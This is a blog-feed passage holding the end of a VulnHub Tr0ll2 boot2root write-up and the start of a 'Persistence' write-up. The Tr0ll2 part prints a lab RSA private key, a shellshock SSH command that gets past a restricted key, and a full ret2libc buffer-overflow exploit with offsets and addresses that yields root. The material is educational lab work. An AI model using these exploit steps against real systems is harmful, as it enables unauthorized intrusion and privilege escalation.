&lt;p&gt;We find ourselves with a zip archive called &lt;code&gt;lmao.zip&lt;/code&gt;. A encrypted one :(&lt;/p&gt;

&lt;p&gt;I tried a few passwords from the wordlist that I had built earlier and eventually got to the word we got out of &lt;code&gt;answer.txt&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/troll2# unzip lmao.zip
Archive:  lmao.zip
[lmao.zip] noob password: #ItCantReallyBeThisEasyRightLOL
  inflating: noob

root@kali:~# cat noob
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A unencrypted private key! Called &lt;code&gt;noob&lt;/code&gt;. I guessed &lt;code&gt;noob&lt;/code&gt; may be the username, so I fixed up the permissions on the key and tried my luck:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/troll2# chmod 600 noob
root@kali:~/Desktop/troll2# ssh noob@192.168.56.101 -i noob
TRY HARDER LOL!
Connection to 192.168.56.101 closed.
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;shocking-isn-t-it&#34;&gt;shocking isn&amp;rsquo;t it&lt;/h2&gt;

&lt;p&gt;Surprise surprise. It seemed like we are in fact authenticating, but we don&amp;rsquo;t have a shell. I figured one of two things could be happening here. First, the &lt;code&gt;.bashrc&lt;/code&gt; may have been modified with something that echoes the text &lt;code&gt;TRY HARDER LOL!&lt;/code&gt; and exits, or there is some restriction on the SSH key for &lt;code&gt;noob&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;My first attempts were to specify a command with &lt;code&gt;-t&lt;/code&gt; as &lt;code&gt;/bin/bash&lt;/code&gt;, but this did not work.&lt;/p&gt;

&lt;p&gt;With the current buzz around the recently disclosed &lt;em&gt;shellshock&lt;/em&gt; bug, I thought I&amp;rsquo;d try it assuming its a key restriction:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ssh noob@192.168.56.101 -i noob -t &#39;() { :;}; /bin/bash&#39;
noob@Tr0ll2:~$ id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Shocking :) To confirm, the &lt;code&gt;authorized_keys&lt;/code&gt; file has the entry &lt;code&gt;command=&amp;quot;echo TRY HARDER LOL!&amp;quot;&lt;/code&gt; before the public key.&lt;/p&gt;

&lt;h2 id=&#34;which-door-leads-to-r00t&#34;&gt;which door leads to r00t&lt;/h2&gt;

&lt;p&gt;With shell access to the machine, it was time to start enumerating and learn more about what we are facing next. Nothing particularly interesting popped up, until I noticed a directory &lt;code&gt;/nothing_to_see_here&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;/nothing_to_see_here&lt;/code&gt; had another directory inside of it &lt;code&gt;choose_wisely/&lt;/code&gt; with another 3 sub directories called &lt;code&gt;door1&lt;/code&gt;, &lt;code&gt;door2&lt;/code&gt; and &lt;code&gt;door3&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;All 3 &amp;lsquo;doors&amp;rsquo; had a setuid binary called &lt;code&gt;r00t&lt;/code&gt;. I ran the first one which had the output:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t
Good job, stand by, executing root shell...
BUHAHAHA NOOB!
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$
Broadcast message from noob@Tr0ll2
    (/dev/pts/0) at 0:48 ...

The system is going down for reboot NOW!
Connection to 192.168.56.101 closed by remote host.
Connection to 192.168.56.101 closed.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dam. The VM promptly rebooted. Obviously I need to be a little more careful :D&lt;/p&gt;

&lt;p&gt;The machine rebooted and I logged in again as &lt;code&gt;noob&lt;/code&gt;, changing directories to the &lt;code&gt;r00t&lt;/code&gt; binaries. I tried to run &lt;code&gt;strings&lt;/code&gt; on them, but it seems like the command was unavailable. No worries, next on the list was &lt;code&gt;od&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ od -S 1 door3/r00t
[...]
0001214 __libc_start_main
0001236 GLIBC_2.0
0001320 R
0001453 Q
0001521 %
0001526 h
0001626 h
0001646 h(
0002066 t&amp;amp;
0002073 &#39;
0002305 i
0002620 Good job, stand by, executing root shell...
0002674 BUHAHAHA NOOB!
0002713 /sbin/reboot
0002733 ;0
0002750 L
0002760 p
0003025 zR
0003044
0003060 p
0003077 x
[...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So this is the binary that simply rebooted the machine. What is weird though is that this &lt;code&gt;r00t&lt;/code&gt; binary was in &lt;code&gt;door1/&lt;/code&gt; prior to the reboot. I continued to check out the other binaries, when suddenly the folder containing all of the files disappeared and reappeared. After this all of the &lt;code&gt;r00t&lt;/code&gt; binaries were shuffled around again.&lt;/p&gt;

&lt;p&gt;This was only a minor annoyance and I had enough time to check out the binaries using &lt;code&gt;od&lt;/code&gt; to figure out which one I should be looking at. The other binary that would have been a problem appears to chmod /bin/ls so that it becomes unusable. Lucky I missed that one.&lt;/p&gt;

&lt;h2 id=&#34;bof-bof-bof-your-boat&#34;&gt;bof bof bof your boat&amp;hellip;&lt;/h2&gt;

&lt;p&gt;I copied the binary of interest to &lt;code&gt;/tmp&lt;/code&gt; so that I wont be bothered by the shuffling thing that was going on again. Most importantly the one of interest was slightly bigger in size compared to the others so it was easy to identify it apart from the others.&lt;/p&gt;

&lt;p&gt;With the binary in &lt;code&gt;/tmp&lt;/code&gt;, &lt;code&gt;noob&lt;/code&gt; was the owner. For testing purposes this was ok as the exploit should work the same with the one with the desired permissions.&lt;/p&gt;

&lt;p&gt;To check the security applied to the binary at compile time, I copied it off using &lt;code&gt;xxd&lt;/code&gt; to my local machine and checked it out.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# gdb -q ./r00t
Reading symbols from /root/Desktop/troll2/r00t...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partia
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No security? EZ PEZE.&lt;/p&gt;

&lt;p&gt;Next, it was time to start fuzzing the binary and see if it has any interesting behavior:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/tmp$ ./r00t $(python -c &#39;print &amp;quot;A&amp;quot; * 500&#39;)
Segmentation fault
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;500 &amp;ldquo;A&amp;rdquo;&amp;rsquo;s, and we have a crash. Perfect. It also seems like a really easy buffer overflow vulnerability. I quickly checked that ASLR was not enabled. If it is not, I planned on popping this one with a ret2libc attack.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/tmp$ ldd ./r00t
    linux-gate.so.1 =&amp;gt;  (0xb7fff000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
    /lib/ld-linux.so.2 (0x80000000)

noob@Tr0ll2:/tmp$ ldd ./r00t
    linux-gate.so.1 =&amp;gt;  (0xb7fff000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
    /lib/ld-linux.so.2 (0x80000000)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Both entries returned the same address for libc, indicating that ASLR was not enabled :)
Tr0ll2 was also nice enough to include &lt;code&gt;gdb&lt;/code&gt;, making the exploit development process very easy.&lt;/p&gt;

&lt;h2 id=&#34;the-exploit&#34;&gt;the exploit&lt;/h2&gt;

&lt;p&gt;With all of the information gathered so far about this particularly interesting &lt;code&gt;r00t&lt;/code&gt; binary, it was time to quickly write the overflow exploit to attempt and spawn us a root shell.&lt;/p&gt;

&lt;p&gt;First, we have to inspect the crash when we send those 500 A&amp;rsquo;s&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

(gdb) r $(python -c &#39;print &amp;quot;A&amp;quot; * 500&#39;)
Starting program: /tmp/r00t $(python -c &#39;print &amp;quot;A&amp;quot; * 500&#39;)

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

(gdb) x/x $eip
0x41414141: Cannot access memory at address 0x41414141
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We see that we have cleanly overwritten EIP with our hex representation of A&amp;rsquo;s. We don&amp;rsquo;t know the exact location of where this is overwritten from our input yet, so lets find out by providing it a unique buffer using the metasploit &lt;code&gt;pattern_create&lt;/code&gt; script, and then checking the offset using the &lt;code&gt;pattern_offset&lt;/code&gt; script.&lt;/p&gt;

&lt;p&gt;Lets generate the pattern.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# locate pattern_create
/usr/share/metasploit-framework/tools/pattern_create.rb

root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, we provide this pattern as input to crash the application and inspect the registers:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

(gdb) r &amp;quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&amp;quot;

Starting program: /tmp/r00t &amp;quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&amp;quot;

Program received signal SIGSEGV, Segmentation fault.
0x6a413969 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So we crashed at &lt;code&gt;0x6a413969&lt;/code&gt;. Lets check the offset of this in our buffer.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 6a413969
[*] Exact match at offset 268
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So at byte 268 we start to override EIP cleanly. We can test this to make sure our calculations were correct by replacing that section with B&amp;rsquo;s:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

(gdb) r $(python -c &#39;print &amp;quot;A&amp;quot; *268 + &amp;quot;BBBB&amp;quot;&#39;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /tmp/r00t $(python -c &#39;print &amp;quot;A&amp;quot; *268 + &amp;quot;BBBB&amp;quot;&#39;)

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

(gdb) x/x $eip
0x42424242: Cannot access memory at address 0x42424242
(gdb)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So with that done, we can deduce that we can cleanly override EIP at offset 268.&lt;/p&gt;

&lt;p&gt;The next part we need to get is the location of &lt;code&gt;system()&lt;/code&gt; from within libc. We can leak this address quite easily by inspecting the memory from a running application such as &lt;code&gt;r00t&lt;/code&gt; linked to it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

(gdb) b *main   # here we break on the main function
Breakpoint 1 at 0x8048444: file bof.c, line 3.

(gdb) r         # here we run the application....
Starting program: /tmp/r00t

Breakpoint 1, main (argc=1, argv=0xbffffd84) at bof.c:3
3   bof.c: No such file or directory.

(gdb) p system  # and leak the locatin of system() in memory
$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0xb7e6b060 &amp;lt;system&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So &lt;code&gt;system()&lt;/code&gt; lives at &lt;code&gt;0xb7e6b060&lt;/code&gt;. We are going to point EIP here and provide it a argument from a environment variable. I don&amp;rsquo;t really care if the application exits cleanly, however you can easily get that right by leaking the location of &lt;code&gt;exit()&lt;/code&gt; too and placing that as the ret address in the exploit. I just like to type JUNK ;)&lt;/p&gt;

&lt;p&gt;So far our exploit payload will look something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;A * 268 + system() + JUNK
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The last thing we need is a argument for &lt;code&gt;system()&lt;/code&gt; on the stack so that it can execute that. One way of achieving this is to provide the memory location of a string such as &lt;code&gt;/bin/sh&lt;/code&gt;. We can easily set an environment variable with this string, locate it in memory and use that.&lt;/p&gt;

&lt;p&gt;So lets create this string, which we will refer to as the EGG.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/tmp$ export EGG=/bin/sh
noob@Tr0ll2:/tmp$ env | grep EGG
EGG=/bin/sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, we can use a small C program to tell us where this EGG is in memory:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/tmp$ cat /tmp/findegg.c
#include &amp;lt;unistd.h&amp;gt;

int main(void)
{
  printf(&amp;quot;EGG address: 0x%lx\n&amp;quot;, getenv(&amp;quot;EGG&amp;quot;)+4);
  return 0;
}

noob@Tr0ll2:/tmp$ gcc /tmp/findegg.c -o /tmp/findegg
[...]

noob@Tr0ll2:/tmp$ /tmp/findegg
EGG address: 0xbfffff04
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So our egg lives at &lt;code&gt;0xbfffff04&lt;/code&gt;. This memory address will probably be different for you if you try, but the process to find it remains the same. We also have to keep in mind that the environment will be slightly different when we execute our exploit in and out of &lt;code&gt;gdb&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;With everything we need, we can deduce that our exploit payload will end up being something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;A * 268 + system() + JUNK + EGG
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lets get the python version of that written up and sent to our vulnerable binary (addresses are written &amp;lsquo;backwards&amp;rsquo; due to the little endian format of the CPU):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/tmp$ ./r00t $(python -c &#39;print &amp;quot;A&amp;quot; *268 + &amp;quot;\x60\xb0\xe6\xb7&amp;quot; + &amp;quot;JUNK&amp;quot; + &amp;quot;\x04\xff\xff\xbf&amp;quot;&#39;)
Segmentation fault
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Wups, segfault. You will find that this is probably because the location of our EGG in memory did not compensate for the length of the binary name. Our binary is called &lt;code&gt;r00t&lt;/code&gt;, which is 4 chars long, so maybe we need to move the location of our EGG up with up to 4 bytes. For demonstration purposes I am going to show all the attempts for each byte:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# so just to recap, we check for the location of the EGG
noob@Tr0ll2:/tmp$ ./findegg
EGG address: 0xbfffff04

# EGG is at 0xbfffff04, so in little endian format we have:
noob@Tr0ll2:/tmp$ ./r00t $(python -c &#39;print &amp;quot;A&amp;quot; *268 + &amp;quot;\x60\xb0\xe6\xb7&amp;quot; + &amp;quot;JUNK&amp;quot; + &amp;quot;\x04\xff\xff\xbf&amp;quot;&#39;)
Segmentation fault

# A segfault, lets move it up 1 byte
noob@Tr0ll2:/tmp$ ./r00t $(python -c &#39;print &amp;quot;A&amp;quot; *268 + &amp;quot;\x60\xb0\xe6\xb7&amp;quot; + &amp;quot;JUNK&amp;quot; + &amp;quot;\x05\xff\xff\xbf&amp;quot;&#39;)
sh: 1: =/bin/sh: not found
Segmentation fault

# another segfault, however we have a little diagnostics message now
# showing that we are not far off :)
noob@Tr0ll2:/tmp$ ./r00t $(python -c &#39;print &amp;quot;A&amp;quot; *268 + &amp;quot;\x60\xb0\xe6\xb7&amp;quot; + &amp;quot;JUNK&amp;quot; + &amp;quot;\x06\xff\xff\xbf&amp;quot;&#39;)
$
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;trollin-the-rootin&#34;&gt;trollin the rootin&lt;/h2&gt;

&lt;p&gt;So &lt;code&gt;0xbfffff06&lt;/code&gt; as a EGG location will give us shell in our testing! To finish off then, I have to find the correct &lt;code&gt;r00t&lt;/code&gt; binary in all of the &lt;code&gt;door{1,2,3}&lt;/code&gt; folders and attempt my exploit there:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c &#39;print &amp;quot;A&amp;quot; *268 + &amp;quot;\x60\xb0\xe6\xb7&amp;quot; + &amp;quot;JUNK&amp;quot; + &amp;quot;\x06\xff\xff\xbf&amp;quot;&#39;)
sh: 1: in:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games: not found
Segmentation fault
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Another segmentation fault! This time we seem to be waaaaaaaay off too. This is because of the &lt;code&gt;PWD&lt;/code&gt; changing so drastically. To fix this, we simply rerun our &lt;code&gt;findegg&lt;/code&gt; program and compensate for the binary name. When completing this, I had a successful run as follows:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c &#39;print &amp;quot;A&amp;quot; *268 + &amp;quot;\x60\xb0\xe6\xb7&amp;quot; + &amp;quot;JUNK&amp;quot; + &amp;quot;\xe2\xfe\xff\xbf&amp;quot;&#39;)
# id
uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This time I had to move the memory location for for my EGG on by quite a few bytes, in fact from &lt;code&gt;0xbffffeda&lt;/code&gt; all the way to &lt;code&gt;0xbffffee2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;As I was now root, I may cat the &lt;code&gt;Proof.txt&lt;/code&gt; in &lt;code&gt;/root&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# cat /root/Proof.txt
You win this time young Jedi...

a70354f0258dcc00292c72aab3c8b1e4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks &lt;a href=&#34;https://twitter.com/Maleus21&#34;&gt;@Maleus21&lt;/a&gt; for the fun VM and &lt;a href=&#34;http://vulnhub.com/&#34;&gt;VulnHub&lt;/a&gt; for the hosting :)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>From Persistence</title>
      <link>https://leonjza.github.io/blog/2014/09/18/from-persistence/</link>
      <pubDate>Thu, 18 Sep 2014 06:58:53 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2014/09/18/from-persistence/</guid>
      <description>

&lt;h2 id=&#34;persist-we-must&#34;&gt;persist we must!&lt;/h2&gt;

&lt;p&gt;Persistence! A new boot2root hosted &lt;a href=&#34;https://twitter.com/vulnhub&#34;&gt;@VulnHub&lt;/a&gt;, authored by &lt;a href=&#34;https://twitter.com/superkojiman&#34;&gt;@superkojiman&lt;/a&gt; and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a &lt;a href=&#34;http://blog.vulnhub.com/2014/09/competition-persistence.html&#34;&gt;writeup competition&lt;/a&gt; launched on September the 7th, and ran up until October th 5th.&lt;/p&gt;

&lt;p&gt;This is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go &amp;ldquo;meh, next&amp;rdquo;. As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!&lt;/p&gt;

&lt;h2 id=&#34;lets-get-our-hands-dirty&#34;&gt;lets get our hands dirty&lt;/h2&gt;

&lt;p&gt;As usual, the goto tool was Kali Linux, and the normal steps of adding the OVA image to Virtualbox, booting, finding the assigned IP and running a Nmap scan against it was used.&lt;/p&gt;

&lt;p&gt;My VM got the IP 192.168.56.104, and the first Nmap result was:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap 192.168.56.104 --reason -sV -p-

Starting Nmap 6.46 ( http://nmap.org ) at 2014-09-18 07:01 SAST
Nmap scan report for 192.168.56.104
Host is up, received reset (0.0037s latency).
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack nginx 1.4.7

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4131.90 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Not exactly much to work with, but its something at least! We know now that according to the web server banners, we are facing nginx. A welcome change to the usual apache stuff we see! A quick and nasty Google for nginx 1.4.7 exploits also did not return with any really interesting results. Not a problem really.&lt;/p&gt;

&lt;p&gt;Browsing to the site did not reveal anything interesting. A creepy image of melting clocks (what&amp;hellip;) with the page sources serving it being minimal and uninteresting too. Manually poking about the web paths (for things like robots.txt etc) also did not reveal anything. The first hint however came when I fiddled with the index page location.&lt;/p&gt;

&lt;p&gt;By default, most web servers will serve the default index page when no location is specified from the web root. So, I tried &lt;code&gt;index.html&lt;/code&gt;, and got the normal landing. When I requested &lt;code&gt;index.php&lt;/code&gt; though, things changed drastically:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# curl -v 192.168.56.104/index.php
* About to connect() to 192.168.56.104 port 80 (#0)
*   Trying 192.168.56.104...
* connected
* Connected to 192.168.56.104 (192.168.56.104) port 80 (#0)
&amp;gt; GET /index.php HTTP/1.1
&amp;gt; User-Agent: curl/7.26.0
&amp;gt; Host: 192.168.56.104
&amp;gt; Accept: */*

* additional stuff not fine transfer.c:1037: 0 0
* HTTP 1.1 or later with persistent connection, pipelining supported
&amp;lt; HTTP/1.1 404 Not Found
&amp;lt; Server: nginx/1.4.7
&amp;lt; Date: Thu, 18 Sep 2014 07:28:18 GMT
&amp;lt; Content-Type: text/html
&amp;lt; Transfer-Encoding: chunked
&amp;lt; Connection: keep-alive
&amp;lt; X-Powered-By: PHP/5.3.3

No input file specified.

* Connection #0 to host 192.168.56.104 left intact
* Closing connection #0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As can be seen in the output above, the header &lt;code&gt;X-Powered-By: PHP/5.3.3&lt;/code&gt; is now present, and the output &lt;code&gt;No input file specified.&lt;/code&gt;. I recognized this as the behavior of Nginx when PHP-FPM is unable to locate the .php file it should be serving.&lt;/p&gt;

&lt;h2 id=&#34;finding-that-de-bugger&#34;&gt;finding that (de)bugger&lt;/h2&gt;

